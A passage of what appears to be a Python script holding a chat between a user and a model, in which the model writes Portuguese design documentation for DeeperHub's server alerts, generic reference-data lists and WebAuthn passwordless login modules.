*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `created_by_user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes.
*   `DeeperHub.Notifications` (Opcional): Se alertas tamb√©m disparam notifica√ß√µes formais.
*   `DeeperHub.Security.XssProtection` / `Shared.ContentValidation`: Para sanitizar mensagens.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **UI do Propriet√°rio do Servidor:** Formul√°rios para criar/gerenciar alertas.
*   **P√°gina do Servidor (UI do Jogador):** Se√ß√£o para exibir alertas ativos (`list_active_alerts_by_server`).
*   **`AlertStatusUpdateWorker`:** Para gerenciar o ciclo de vida de alertas agendados/expirados.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `AlertSchema`.
*   Testar a l√≥gica de `is_active` com `start_time` e `end_time`.
*   Testar a listagem de alertas ativos vs. todos os alertas.
*   Testar a sanitiza√ß√£o da mensagem do alerta.
*   Localiza√ß√£o: `test/deeper_hub/server_alerts/`.

### 10.2. M√©tricas

*   `deeper_hub.server_alerts.created.count` (tags: `server_id`, `alert_type`, `severity`)
*   `deeper_hub.server_alerts.displayed.count` (tags: `server_id`, `alert_id`) (Se o rastreamento de visualiza√ß√£o for implementado).
*   `deeper_hub.server_alerts.active.gauge` (Gauge, tags: `server_id`)

### 10.3. Logs

*   **N√≠vel INFO:** Novo alerta criado/publicado. Alerta expirado/desativado.
*   **N√≠vel WARNING:** Tentativa n√£o autorizada de gerenciar um alerta.

### 10.4. Telemetria

*   `[:deeper_hub, :server_alerts, :alert, :created | :updated | :deleted | :status_changed]`
    *   Metadados: `%{alert_id: id, server_id: id, author_id: id, new_status: atom_if_changed}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de valida√ß√£o ao criar/atualizar retornam `{:error, changeset}`.
*   Opera√ß√µes n√£o autorizadas retornam `{:error, :unauthorized}`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Sanitiza√ß√£o de Conte√∫do:** A mensagem do alerta deve ser sanitizada para prevenir XSS, pois √© exibida na UI.
*   **Autoriza√ß√£o:** Apenas propriet√°rios de servidores ou administradores devem poder criar/gerenciar alertas para um servidor.
*   **Abuso:** Limitar a frequ√™ncia com que alertas podem ser postados ou o n√∫mero de alertas ativos para evitar spam visual.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novos tipos de alerta ou severidades devem ser adicionados √† configura√ß√£o.
*   Considere como os alertas ser√£o renderizados na UI ao definir o comprimento e o tipo de conte√∫do.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Permitir \"fixar\" um alerta importante para que ele permane√ßa vis√≠vel por mais tempo ou no topo.
*   [ ] Suporte para alertas com a√ß√µes (ex: um bot√£o \"Junte-se ao Evento Agora!\" em um alerta de in√≠cio de evento).
*   [ ] Permitir que usu√°rios individuais \"dispensem\" alertas que j√° viram.
*   [ ] Hist√≥rico de alertas para administradores com mais detalhes de quem criou/modificou.
*   [ ] Internacionaliza√ß√£o das mensagens de alerta se o conte√∫do for padronizado para certos tipos.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este cobre os Alertas de Servidor! Eles s√£o uma forma √∫til de comunica√ß√£o r√°pida.

Para o pr√≥ximo, podemos fazer o `DeeperHub.ServerUpdateMessages` (que √© para comunica√ß√£o mais longa, como patch notes), ou `DeeperHub.Lists` (o m√≥dulo gen√©rico de listas da documenta√ß√£o original), ou algum outro?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""J√° detalhamos o `DeeperHub.ServerUpdateMessages`.

Vamos agora para o `DeeperHub.Lists`. Este m√≥dulo, conforme a documenta√ß√£o original, parece ser um local para armazenar listas de dados gen√©ricos como tipos de conquistas, categorias, tipos de conte√∫do, engines de jogos, etc. Essencialmente, dados de enumera√ß√£o ou \"lookup tables\".

---

# M√≥dulo: `DeeperHub.Lists` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Lists`

O m√≥dulo `DeeperHub.Lists` (originalmente `DeeperHub.Services.Lists`) serve como um **reposit√≥rio centralizado para listas de dados de refer√™ncia e enumera√ß√µes** usadas em todo o sistema DeeperHub. Em vez de hardcodar essas listas em v√°rios m√≥dulos ou ter m√∫ltiplas tabelas pequenas e isoladas, este m√≥dulo fornece uma maneira gen√©rica de armazenar, gerenciar e consultar esses \"tipos\" ou \"categorias\".

Exemplos de listas que podem ser gerenciadas aqui:
*   Tipos de Conquistas (ex: 'Milestone', 'Event')
*   Categorias Gerais (ex: 'Gaming', 'Programming')
*   Tipos de Conte√∫do (ex: 'Article', 'Video')
*   Engines de Jogos (ex: 'Unity', 'Unreal Engine')
*   Tipos de Feedback (ex: 'Bug Report', 'Feature Request')
*   Idiomas Suportados
*   Tipos de Rede de Servidor
*   Plataformas Suportadas
*   Status Comuns (ex: para tickets, servidores, etc., se n√£o forem espec√≠ficos demais para seus pr√≥prios m√≥dulos)
*   Tags Globais (se houver um sistema de tags que n√£o seja espec√≠fico apenas para servidores)

O objetivo √© fornecer consist√™ncia, facilitar a adi√ß√£o de novas op√ß√µes e permitir que a UI popule seletores e filtros de forma din√¢mica. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Itens de Lista Gen√©ricos (`create_list_item/2`, `get_list_item/2`, `update_list_item/2`, `delete_list_item/1`):**
    *   Permitir que administradores criem novos itens para uma lista espec√≠fica (ex: adicionar um novo \"Tipo de Conquista\").
    *   Cada item de lista teria um `list_type` (identificador da lista, ex: `:achievement_type`), um `value` (o valor real, ex: \"milestone\"), uma `label` (para exibi√ß√£o, ex: \"Marco Hist√≥rico\"), e opcionalmente `description`, `is_active`, `metadata` (JSONB para dados extras).
    *   Atualizar ou desativar/excluir itens de lista.
*   **Consulta de Itens de Lista:**
    *   Listar todos os itens para um `list_type` espec√≠fico (`list_items_by_type/1`).
    *   Obter um item espec√≠fico pelo seu valor ou ID dentro de um `list_type`.
    *   Filtrar itens por `is_active`.
*   **Valida√ß√£o de Dados:**
    *   Garantir que os valores e labels sejam √∫nicos dentro de um `list_type`.
    *   Validar os campos ao criar/atualizar itens.
*   **Caching:**
    *   Cachear listas frequentemente acessadas para performance, j√° que esses dados de refer√™ncia raramente mudam.
*   **Internacionaliza√ß√£o de Labels (Opcional):**
    *   Se as `labels` precisarem ser traduzidas, este m√≥dulo pode integrar com `Core.Internationalization` ou armazenar tradu√ß√µes no campo `metadata`.
*   **Observabilidade e Auditoria:**
    *   Logar e auditar a cria√ß√£o/modifica√ß√£o de itens de lista, especialmente aqueles que afetam a l√≥gica do sistema.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Lists` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a listas gen√©ricas.
    *   Delega para o `ListsService`.
2.  **`DeeperHub.Lists.Services.ListsService` (ou `DefaultListsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio para o gerenciamento de itens de lista.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ListItemSchema`.
        *   `DeeperHub.Core.Cache`: Para cachear listas.
        *   `DeeperHub.Core.ConfigManager`: Para obter a lista de `list_type`s conhecidos ou configura√ß√µes padr√£o.
        *   `DeeperHub.Audit`: Para auditar modifica√ß√µes.
3.  **`DeeperHub.Lists.Schemas.ListItemSchema` (Nova Sugest√£o, em vez de m√∫ltiplos schemas pequenos):**
    *   Um schema Ecto gen√©rico para armazenar todos os itens de lista.
    *   Campos: `id`, `list_type` (string ou atom, indexado), `value` (string, indexado dentro do `list_type`), `label` (string), `description` (text, opcional), `metadata` (jsonb, opcional), `is_active` (boolean, default: true), `sort_order` (integer, opcional), `inserted_at`, `updated_at`.
    *   √çndice √∫nico em `(list_type, value)`.
4.  **`DeeperHub.Lists.Storage` (ou l√≥gica no `ListsService`):**
    *   Encapsula as queries Ecto para `ListItemSchema`.
5.  **`DeeperHub.Lists.CachedAdapter` (Opcional, da documenta√ß√£o original para outros servi√ßos, mas aplic√°vel aqui):**
    *   Camada de cache expl√≠cita se o `Core.Cache` gen√©rico n√£o for suficiente.

*(Os m√∫ltiplos schemas pequenos listados na documenta√ß√£o original como `AchievementType`, `Category`, `ContentType`, etc., seriam consolidados no `ListItemSchema` usando o campo `list_type` para diferenci√°-los. Isso simplifica muito a manuten√ß√£o e a adi√ß√£o de novas listas sem altera√ß√µes de schema no DB.)*

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/lists/
‚îú‚îÄ‚îÄ lists.ex                          # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ lists_service.ex              # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ list_item_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional)
‚îú‚îÄ‚îÄ supervisor.ex                     # (Se houver GenServers, ex: para cache warming)
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Schema Gen√©rico √önico:** Usar um `ListItemSchema` com um campo `list_type` √© mais escal√°vel e flex√≠vel do que criar uma nova tabela para cada pequena lista de enumera√ß√£o.
*   **`value` vs. `label`:** O `value` √© o identificador program√°tico (ex: `:bug_report`, `\"milestone_ach\") e a `label` √© para exibi√ß√£o na UI (ex: \"Relat√≥rio de Bug\", \"Conquista de Marco\").
*   **Dados Est√°ticos vs. Gerenciados por Admin:** Decidir se essas listas s√£o populadas via seeds no deploy (mais est√°tico) ou gerenciadas dinamicamente por administradores atrav√©s de uma UI. A abordagem com `ListItemSchema` facilita o gerenciamento din√¢mico.
*   **Caching Agressivo:** Como esses dados de refer√™ncia mudam raramente, eles s√£o candidatos ideais para caching agressivo.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Popular um Dropdown na UI para Sele√ß√£o de Categoria de Suporte:**
    *   Frontend/API chama `DeeperHub.Lists.list_items_by_type(:support_ticket_category, %{is_active: true, sort_by: :label_asc})`.
    *   A lista de `%{value: \"technical_issue\", label: \"Problema T√©cnico\"}, ...` √© usada para renderizar o dropdown.
*   **Administrador Adiciona um Novo \"Tipo de Recompensa\":**
    *   Admin usa uma interface de gerenciamento.
    *   API chama `DeeperHub.Lists.create_list_item(%{list_type: :reward_type, value: \"exclusive_skin\", label: \"Skin Exclusiva\", description: \"Desbloqueia uma skin rara para o avatar.\"}, admin_user_id)`.
*   **Sistema Valida um `event_type` Fornecido pelo Usu√°rio:**
    *   Ao criar um `ServerEvent`, o `ServerEventsService` verifica se o `event_type` fornecido √© um valor v√°lido.
    *   Chama `DeeperHub.Lists.get_list_item_by_value(:server_event_type, user_provided_event_type)`. Se retornar `nil` ou inativo, o tipo √© inv√°lido.

## üåä 5. Fluxos Importantes

### Fluxo de Adi√ß√£o de um Novo Item de Lista por um Administrador

1.  **Administrador (UI):** Seleciona a lista (ex: \"Tipos de Feedback\"), preenche `value` (\"interface_bug\") e `label` (\"Bug de Interface\").
2.  **Controller API (Admin):** Valida permiss√µes. Chama `DeeperHub.Lists.create_list_item(admin_user_id, %{list_type: :feedback_type, value: \"interface_bug\", label: \"Bug de Interface\"})`.
3.  **`ListsService.create_list_item/2`:**
    *   Valida os atributos (ex: `list_type` √© conhecido, `value` √© √∫nico para esse `list_type`).
    *   Cria um `ListItemSchema` changeset.
    *   Se v√°lido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `list_item.created` no `Core.EventBus`.
        *   Invalida o cache para `:feedback_type`.
        *   Audita a a√ß√£o.
        *   Retorna `{:ok, list_item_struct}`.
    *   Se falha, retorna erro.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Lists`)

### 6.1. Gerenciamento de Itens (Principalmente Admin)

*   **`DeeperHub.Lists.create_list_item(admin_user_id :: String.t(), attrs :: map()) :: {:ok, ListItem.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{list_type: atom() | String.t(), value: String.t(), label: String.t(), description: String.t() | nil, metadata: map() | nil, is_active: boolean() | true, sort_order: integer() | nil}`.
*   **`DeeperHub.Lists.update_list_item(admin_user_id :: String.t(), list_item_id :: String.t(), attrs :: map()) :: {:ok, ListItem.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.Lists.delete_list_item(admin_user_id :: String.t(), list_item_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found | :in_use}`**
    *   Pode impedir a exclus√£o se o item estiver em uso por outras entidades, preferindo desativar (`is_active: false`).

### 6.2. Consulta de Itens (P√∫blico/Sistema)

*   **`DeeperHub.Lists.list_items_by_type(list_type :: atom() | String.t(), opts :: keyword()) :: {:ok, list(ListItem.t())}`**
    *   `opts`: `:is_active` (boolean, Padr√£o: `true`), `:sort_by` (`:label`, `:value`, `:sort_order`), `:sort_order_direction` (`:asc`, `:desc`).
*   **`DeeperHub.Lists.get_list_item_by_value(list_type :: atom() | String.t(), item_value :: String.t(), opts :: keyword()) :: {:ok, ListItem.t() | nil}`**
    *   `opts`: `:is_active` (boolean, Padr√£o: `true`).
*   **`DeeperHub.Lists.get_list_item_label(list_type :: atom() | String.t(), item_value :: String.t(), default_label :: String.t() | nil) :: String.t() | nil` (Nova Sugest√£o)**
    *   Fun√ß√£o de conveni√™ncia para obter rapidamente a `label` de um `value`.
*   **`DeeperHub.Lists.get_all_list_types() :: {:ok, list(atom() | String.t())}` (Nova Sugest√£o)**
    *   Retorna todos os `list_type`s distintos definidos no sistema.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:lists, :predefined_list_types]`** (List de Atoms/Strings): Uma lista de todos os `list_type`s que s√£o conhecidos pelo sistema. Pode ser usado para valida√ß√£o ou para popular UIs de administra√ß√£o.
    *   Ex: `[:achievement_type, :category, :content_type, :engine, :feedback_type, :language, :network_type, :platform, :server_status, :tag_category, :support_ticket_priority]`
*   **`[:lists, :cache, :list_items_ttl_seconds]`** (Integer): TTL para cache de listas de itens. (Padr√£o: `3600` ou mais, pois mudam raramente).
*   **`[:lists, :allow_dynamic_list_types]`** (Boolean): Se `false`, apenas `list_type`s definidos em `predefined_list_types` podem ser criados. (Padr√£o: `false` para maior controle).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.Repo`, `Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Auth`/`RBAC`: Para permiss√µes de administra√ß√£o das listas.
*   `DeeperHub.Audit`: Para auditar modifica√ß√µes.
*   `DeeperHub.Core.Internationalization` (Opcional): Se as `labels` forem traduzidas.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Valida√ß√£o de Entrada:** M√≥dulos de servi√ßo usam `get_list_item_by_value/3` para validar se um valor fornecido pelo usu√°rio para um campo de \"tipo\" √© uma op√ß√£o v√°lida e ativa.
    ```elixir
    # Em DeeperHub.Support.Services.SupportService
    def create_ticket(attrs) do
      case DeeperHub.Lists.get_list_item_by_value(:support_ticket_priority, attrs[:priority_value]) do
        {:ok, nil} -> {:error, %{priority: \"Prioridade inv√°lida\"}}
        {:ok, _priority_item} -> # Prossiga com a cria√ß√£o
        # ...
      end
    end
    ```
*   **Popular Dropdowns em UIs:** A UI busca os itens de uma lista via API para preencher campos `<select>`.
*   **Seed de Dados:** O arquivo `priv/repo/seeds.exs` pode usar `DeeperHub.Lists.create_list_item/2` para popular as listas iniciais durante o setup do banco de dados.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ListItemSchema`.
*   Testar a unicidade de `value` dentro de um `list_type`.
*   Testar as fun√ß√µes de listagem com filtros (`:is_active`).
*   Testar a l√≥gica de cache.
*   Localiza√ß√£o: `test/deeper_hub/lists/`.

### 10.2. M√©tricas

*   `deeper_hub.lists.items.created.count` (tags: `list_type`)
*   `deeper_hub.lists.items.updated.count` (tags: `list_type`)
*   `deeper_hub.lists.cache.hit.count` (tags: `list_type`)
*   `deeper_hub.lists.cache.miss.count` (tags: `list_type`)

### 10.3. Logs

*   **N√≠vel INFO:** Novo item de lista criado/atualizado/desativado. Cache de lista invalidado.
*   **N√≠vel WARNING:** Tentativa de criar item para um `list_type` n√£o permitido (se `allow_dynamic_list_types` for `false`).
*   **N√≠vel ERROR:** Falha ao persistir item de lista.

### 10.4. Telemetria

*   `[:deeper_hub, :lists, :item, :created | :updated | :deleted]`
    *   Metadados: `%{list_item_id: id, list_type: type, value: val, admin_id: id}`
*   `[:deeper_hub, :lists, :query, :by_type]`
    *   Metadados: `%{list_type: type, from_cache: boolean, result_count: count}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de valida√ß√£o ao criar/atualizar retornam `{:error, changeset}`.
*   Tentativa de obter um item inexistente retorna `nil` ou `{:ok, nil}`.
*   Opera√ß√µes de escrita por usu√°rios n√£o autorizados s√£o bloqueadas por `RBAC` antes de atingir o servi√ßo.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Autoriza√ß√£o:** A modifica√ß√£o de itens de lista deve ser restrita a administradores.
*   **Valida√ß√£o de `list_type`:** Se `allow_dynamic_list_types` for `true`, deve haver alguma valida√ß√£o no formato do `list_type` para evitar a cria√ß√£o de um n√∫mero excessivo ou malformado de tipos de lista.
*   **Impacto das Mudan√ßas:** Alterar ou desativar um `value` de um `list_type` que √© usado como enum em c√≥digo ou no banco de dados pode ter consequ√™ncias. Planejar essas mudan√ßas com cuidado (ex: migra√ß√µes de dados, preferir desativar a excluir).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar uma nova lista de dados de refer√™ncia, defina um novo `list_type` (e adicione-o a `[:lists, :predefined_list_types]` se necess√°rio) e popule-o via seeds ou UI de admin.
*   Considere se a `label` precisa de internacionaliza√ß√£o.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para gerenciar todos os `list_type`s e seus itens.
*   [ ] Adicionar suporte expl√≠cito para internacionaliza√ß√£o das `labels` dos `ListItemSchema` (ex: um campo `translations` JSONB ou uma tabela separada).
*   [ ] Permitir a defini√ß√£o de hierarquias simples entre itens de uma lista (ex: categorias e subcategorias) usando um campo `parent_list_item_id`.
*   [ ] Adicionar a capacidade de \"fixar\" certos valores para que sempre apare√ßam no topo das listas, independentemente da ordena√ß√£o.
*   [ ] Worker para verificar a consist√™ncia: garantir que todos os `list_type`s referenciados em outras partes do sistema (ex: em `enum` fields de outros schemas) existam como `ListItemSchema`s.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo `Lists` pode simplificar bastante o gerenciamento de dados de enumera√ß√£o!

Agora, temos alguns m√≥dulos de \"Servi√ßos\" da documenta√ß√£o original que ainda n√£o foram convertidos em contextos de dom√≠nio mais amplos:
*   `DeeperHub.Services.ServerAdvertisements` (j√° fizemos)
*   `DeeperHub.Services.ServerAlerts` (j√° fizemos)
*   `DeeperHub.Services.ServerEvents` (j√° fizemos)
*   `DeeperHub.Services.ServerPackages` (j√° fizemos)
*   `DeeperHub.Services.ServerReviews` (j√° fizemos)
*   `DeeperHub.Services.ServerTags` (j√° fizemos)
*   `DeeperHub.Services.ServerUpdateMessages` (j√° fizemos)
*   `DeeperHub.Services.UserInteractions` (j√° fizemos)
*   `DeeperHub.Services.Achievements` (j√° fizemos)
*   `DeeperHub.Services.Challenges` (j√° fizemos)
*   `DeeperHub.Services.Rewards` (j√° fizemos)
*   `DeeperHub.Services.Support` (j√° fizemos)

E alguns m√≥dulos de seguran√ßa que poder√≠amos aprofundar, se necess√°rio, al√©m do que j√° foi coberto em seus contextos principais:
*   `DeeperHub.Security.AtRestEncryptionService` (coberto em `Core.EncryptionService`)
*   `DeeperHub.Security.ResponseSanitizer` (j√° fizemos)

E tamb√©m temos os m√≥dulos de `Console` e `ModuleInspector`.

Qual seria o pr√≥ximo? Que tal `DeeperHub.WebAuthn` para completar as op√ß√µes de autentica√ß√£o, ou o `DeeperHub.Console` para ferramentas de administra√ß√£o?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos detalhar o `DeeperHub.WebAuthn`. Este m√≥dulo √© fundamental para oferecer uma forma moderna e segura de autentica√ß√£o sem senha.

---

# M√≥dulo: `DeeperHub.WebAuthn` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.WebAuthn`

O m√≥dulo `DeeperHub.WebAuthn` implementa a funcionalidade de autentica√ß√£o usando o padr√£o **Web Authentication (WebAuthn)**, que √© parte do conjunto de especifica√ß√µes FIDO2. Ele permite que os usu√°rios se registrem e se autentiquem em DeeperHub usando autenticadores fortes, como chaves de seguran√ßa f√≠sicas (YubiKey, etc.), biometria embutida em dispositivos (Touch ID, Windows Hello, Android biometrics), ou outros m√©todos FIDO2.

Este m√≥dulo lida com:
*   O fluxo de registro de novas credenciais WebAuthn para um usu√°rio.
*   O fluxo de autentica√ß√£o de um usu√°rio usando uma credencial WebAuthn previamente registrada.
*   O gerenciamento das credenciais WebAuthn associadas a cada usu√°rio (listagem, remo√ß√£o).

O objetivo √© fornecer uma op√ß√£o de login altamente segura, resistente a phishing e que pode eliminar a necessidade de senhas tradicionais. üòä

*(Nota: Na documenta√ß√£o original, `WebAuthnService` era um subm√≥dulo de `MFA`. Aqui, estamos tratando `DeeperHub.WebAuthn` como um m√≥dulo de primeiro n√≠vel, pois, embora possa ser usado como um fator MFA, tamb√©m pode ser um m√©todo de login prim√°rio sem senha. Ele seria fortemente integrado com `DeeperHub.MFA` e `DeeperHub.Auth`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **In√≠cio do Registro de Credencial (`begin_registration/3`):**
    *   Gerar op√ß√µes de cria√ß√£o de credencial (challenge, informa√ß√µes da Relying Party, informa√ß√µes do usu√°rio, par√¢metros de chave p√∫blica) para serem enviadas ao cliente/navegador.
    *   Armazenar temporariamente o challenge gerado para valida√ß√£o posterior.
*   **Conclus√£o do Registro de Credencial (`complete_registration/2`):**
    *   Receber a resposta de atesta√ß√£o do autenticador (enviada pelo cliente).
    *   Validar a resposta de atesta√ß√£o, incluindo o challenge, origem, assinatura e formato dos dados da chave p√∫blica.
    *   Se v√°lida, armazenar a nova credencial p√∫blica (ID da credencial, chave p√∫blica, contador de assinatura, tipo de transporte) associada ao usu√°rio.
*   **In√≠cio da Autentica√ß√£o (`begin_authentication/2`):**
    *   Gerar op√ß√µes de asser√ß√£o (challenge, lista de IDs de credenciais permitidas para o usu√°rio) para serem enviadas ao cliente/navegador.
    *   Armazenar temporariamente o challenge.
*   **Conclus√£o da Autentica√ß√£o (`complete_authentication/2`):**
    *   Receber a resposta de asser√ß√£o do autenticador (enviada pelo cliente).
    *   Validar a resposta de asser√ß√£o, incluindo o challenge, origem, ID da credencial e a assinatura sobre os dados do cliente e o challenge.
    *   Verificar o contador de assinatura para prevenir clonagem de autenticador.
    *   Se v√°lida, confirmar a identidade do usu√°rio.
*   **Gerenciamento de Credenciais Registradas:**
    *   Listar as credenciais WebAuthn registradas por um usu√°rio (`list_credentials/1`).
    *   Permitir que usu√°rios removam credenciais WebAuthn registradas (`remove_credential/2`).
*   **Configura√ß√£o da Relying Party (RP):**
    *   Configurar o ID da RP (geralmente o dom√≠nio da aplica√ß√£o) e o nome da RP.
*   **Valida√ß√£o de Origem (Origin Validation):**
    *   Garantir que as respostas do autenticador se originem do dom√≠nio esperado.
*   **Armazenamento Seguro de Dados de Credencial:**
    *   Armazenar chaves p√∫blicas e contadores de assinatura de forma segura.
*   **Integra√ß√£o com `Auth` e `MFA`:**
    *   Ser chamado pelo `DeeperHub.Auth` como um m√©todo de login prim√°rio (sem senha).
    *   Ser chamado pelo `DeeperHub.MFA` como um segundo fator de autentica√ß√£o.
*   **Observabilidade e Auditoria:**
    *   Logar opera√ß√µes de registro e autentica√ß√£o.
    *   Auditar o registro e remo√ß√£o de credenciais.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.WebAuthn` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes WebAuthn.
    *   Delega para o `WebAuthnService`.
2.  **`DeeperHub.WebAuthn.Services.WebAuthnService` (GenServer ou M√≥dulo Funcional com Cache/Storage):**
    *   **Responsabilidade:** Orquestra os fluxos de registro e autentica√ß√£o WebAuthn.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `CredentialSchema`.
        *   `DeeperHub.Accounts`: Para associar credenciais a `user_id`.
        *   `DeeperHub.Core.Cache`: Para armazenar challenges tempor√°rios durante os fluxos.
        *   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes da Relying Party (ID, nome).
        *   Biblioteca WebAuthn (Elixir): Para a l√≥gica de baixo n√≠vel de valida√ß√£o e gera√ß√£o de estruturas WebAuthn.
3.  **Biblioteca WebAuthn para Elixir (Externa ou Interna):**
    *   Uma biblioteca como `Wax` (do Wistia) ou `Webauthnix` (do GitHub) ou uma implementa√ß√£o interna que lida com a complexidade do protocolo WebAuthn (parsing de CBOR, verifica√ß√£o de assinaturas criptogr√°ficas, valida√ß√£o de atesta√ß√£o/asser√ß√£o). √â altamente recomend√°vel usar uma biblioteca bem testada.
4.  **`DeeperHub.WebAuthn.Schema.CredentialSchema` (ex-`Credential`):**
    *   Schema Ecto para armazenar as informa√ß√µes da credencial WebAuthn.
    *   Campos: `id` (ID da credencial, base64url), `user_id`, `public_key` (bin√°rio, formato COSE), `sign_count` (integer), `transports` (lista de strings/√°tomos, ex: `:usb`, `:nfc`, `:ble`, `:internal`), `name` (nome dado pelo usu√°rio), `backed_up` (boolean), `created_at`, `last_used_at`.
5.  **Cache de Challenge (`DeeperHub.Core.Cache` ou ETS dedicado):**
    *   Armazena os challenges gerados durante os fluxos de registro/autentica√ß√£o, associados a um ID de sess√£o ou usu√°rio, com um TTL curto.
6.  **JavaScript do Lado do Cliente (Externo ao Backend):**
    *   O navegador do usu√°rio executa JavaScript (usando a API WebAuthn do navegador `navigator.credentials.create()` e `navigator.credentials.get()`) para interagir com os autenticadores. Este m√≥dulo backend fornece as op√ß√µes para essas chamadas JS e valida as respostas.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/web_authn/
‚îú‚îÄ‚îÄ web_authn.ex                      # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ web_authn_service.ex          # Servi√ßo principal com a l√≥gica de fluxo
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îî‚îÄ‚îÄ credential_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îú‚îÄ‚îÄ supervisor.ex                     # (Se WebAuthnService for GenServer para, por exemplo, limpar challenges)
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Escolha da Biblioteca WebAuthn:** Selecionar uma biblioteca Elixir para WebAuthn que seja mantida, segura e cubra as funcionalidades necess√°rias (atesta√ß√£o, asser√ß√£o, diferentes formatos de chave).
*   **Armazenamento de Challenge:** Onde e como armazenar o challenge entre `begin_*` e `complete_*` √© crucial. A sess√£o do usu√°rio (se j√° existir) ou um cache de curta dura√ß√£o com um identificador de transa√ß√£o s√£o comuns.
*   **Verifica√ß√£o do Contador de Assinatura (Sign Count):** Essencial para detectar clonagem de autenticadores. O `sign_count` enviado pelo autenticador deve ser maior que o √∫ltimo `sign_count` armazenado.
*   **Formatos de Chave P√∫blica:** As chaves s√£o geralmente armazenadas no formato COSE (CBOR Object Signing and Encryption).
*   **User Verification (UV):** Decidir a pol√≠tica para verifica√ß√£o do usu√°rio pelo autenticador (ex: PIN, biometria no autenticador). WebAuthn permite `discouraged`, `preferred`, `required`.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Registra uma Nova Chave de Seguran√ßa (YubiKey):**
    1.  Na UI, usu√°rio clica em \"Adicionar Chave de Seguran√ßa\".
    2.  Frontend chama API que leva a `WebAuthn.begin_registration(user_id, \"Minha YubiKey\")`.
    3.  Backend retorna `PublicKeyCredentialCreationOptions`.
    4.  Frontend passa essas op√ß√µes para `navigator.credentials.create()`.
    5.  Usu√°rio interage com a YubiKey (toca).
    6.  Navegador retorna `PublicKeyCredential` (com `attestationResponse`).
    7.  Frontend envia essa resposta para API que leva a `WebAuthn.complete_registration(user_id, attestation_response)`.
    8.  Backend valida e salva a nova credencial.
*   **Usu√°rio Faz Login com Biometria do Laptop (Windows Hello / Touch ID):**
    1.  Na p√°gina de login, ap√≥s digitar o username, usu√°rio escolhe \"Login com Biometria\".
    2.  Frontend chama API que leva a `WebAuthn.begin_authentication(user_id_ou_username)`.
    3.  Backend retorna `PublicKeyCredentialRequestOptions`.
    4.  Frontend passa para `navigator.credentials.get()`.
    5.  Usu√°rio autentica com biometria no laptop.
    6.  Navegador retorna `PublicKeyCredential` (com `assertionResponse`).
